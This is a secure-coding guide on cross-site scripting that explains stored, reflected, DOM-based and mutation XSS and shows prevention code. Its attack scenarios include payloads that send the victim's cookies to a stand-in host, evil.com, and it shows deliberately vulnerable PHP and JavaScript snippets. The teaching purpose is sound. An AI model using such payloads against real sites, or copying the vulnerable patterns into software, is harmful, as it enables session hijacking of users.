---
description: XSS attack types (stored, reflected, DOM-based, mutation), attack scenarios, real-world impact, and prevention strategies.
---

# Cross-Site Scripting (XSS)

## When to Use

Understand XSS attack vectors whenever your application displays user-generated content, accepts URL parameters, or renders data from any untrusted source.

## XSS Attack Types

| Type | Description | Example | Impact |
|---|---|---|---|
| **Stored XSS** | Malicious script stored in database, displayed to other users | Comment with `<script>` tag saved to DB | Highest risk - affects all users viewing the content |
| **Reflected XSS** | Malicious script in URL/form immediately reflected in response | Search page shows unescaped query `?q=<script>...` | Medium risk - requires victim to click malicious link |
| **DOM-based XSS** | JavaScript manipulates DOM with untrusted data | `document.write(location.hash)` | Medium risk - purely client-side, no server involvement |
| **Mutation XSS (mXSS)** | Browser parses HTML differently than sanitizer | Sanitizer allows `<noscript>`, browser re-parses after sanitization | Hard to detect - bypasses sanitizers |

## Attack Scenarios

**Stored XSS example:**

```text
1. Attacker posts comment: "Great article! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
2. Application saves comment to database without escaping
3. Victim views page with comment
4. Browser executes script, sends victim's session cookie to evil.com
5. Attacker hijacks victim's session
```

**Reflected XSS example:**

```php
// Vulnerable search page
<?php
echo "You searched for: " . $_GET['q'];  // No escaping!
?>

// Attack URL:
// /search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**DOM-based XSS example:**

```html
<script>
    const name = location.hash.substring(1);
    document.getElementById('welcome').innerHTML = 'Welcome ' + name;
</script>

<!-- Attack URL: -->
<!-- /page.html#<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"> -->
```

## Real-World Impact

**CWE-79 (XSS) is the #1 most dangerous software weakness in 2025** according to MITRE CWE Top 25.

**What attackers do with XSS:**

- Steal session cookies — hijack accounts
- Capture keystrokes — steal passwords, credit cards
- Deface websites — replace content
- Distribute malware — drive-by downloads
- Phishing — inject fake login forms
- Cryptomining — use victim's browser for mining
- Worm propagation — XSS payload that spreads itself (Samy worm, 2005)

## Prevention Strategy

**Defense layers (all required):**

1. **Input validation** — allowlist validation
2. **Output encoding** — context-specific escaping
3. **Content Security Policy** — restrict script sources
4. **HTTPOnly cookies** — prevent JavaScript access to session cookies
5. **Security headers** — X-XSS-Protection, X-Content-Type-Options

## Pattern

**Preventing stored XSS:**

```python
from markupsafe import escape
import bleach

# Option 1: Escape everything (no HTML formatting)
def save_comment_plain(comment):
    safe_comment = escape(comment)
    db.execute("INSERT INTO comments (text) VALUES (?)", [safe_comment])

# Option 2: Allow safe HTML subset (preserve formatting)
ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'u', 'a']
ALLOWED_ATTRS = {'a': ['href', 'title']}

def save_comment_html(comment):
    safe_comment = bleach.clean(comment, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS)
    db.execute("INSERT INTO comments (text) VALUES (?)", [safe_comment])
```

**Preventing reflected XSS:**

```php
<?php
$query = $_GET['q'] ?? '';
$safe_query = htmlspecialchars($query, ENT_QUOTES, 'UTF-8');
echo "<p>You searched for: {$safe_query}</p>";
?>
```

**Preventing DOM-based XSS:**

```javascript
// Bad: innerHTML with untrusted data
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome ' + name;  // XSS!

// Good: textContent (no HTML parsing)
const name = location.hash.substring(1);
document.getElementById('welcome').textContent = 'Welcome ' + name;  // Safe

// Good: createElement + textContent
const name = location.hash.substring(1);
const welcome = document.createElement('div');
welcome.textContent = 'Welcome ' + name;
document.getElementById('container').appendChild(welcome);  // Safe
```

## Common Mistakes

- **Escaping only some output** — ALL untrusted data must be escaped. One missed spot = XSS vulnerability
- **Using innerHTML with user data** — Use `textContent` or `innerText` instead. If you must use HTML, sanitize with DOMPurify or similar
- **Blocklist filtering** — Trying to block `<script>` tags fails. Attackers use `<img onerror="...">`, `<svg onload="...">`, `<iframe>`, etc. Use allowlist sanitization
- **Trusting "read-only" data** — Database content can be poisoned. URL parameters can be manipulated. Cookies can be set by attacker. Escape everything
- **Not setting HTTPOnly on session cookies** — Without HTTPOnly flag, XSS can steal session cookies. ALWAYS set HTTPOnly on authentication cookies
- **Forgetting about JSON responses** — API responses with user data need proper Content-Type (`application/json`) and escaping

## See Also

- Previous: [Output Encoding and Escaping](output-encoding-escaping.md) | Next: [XSS Prevention Patterns](xss-prevention-patterns.md)
- Reference: [OWASP XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- Reference: [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
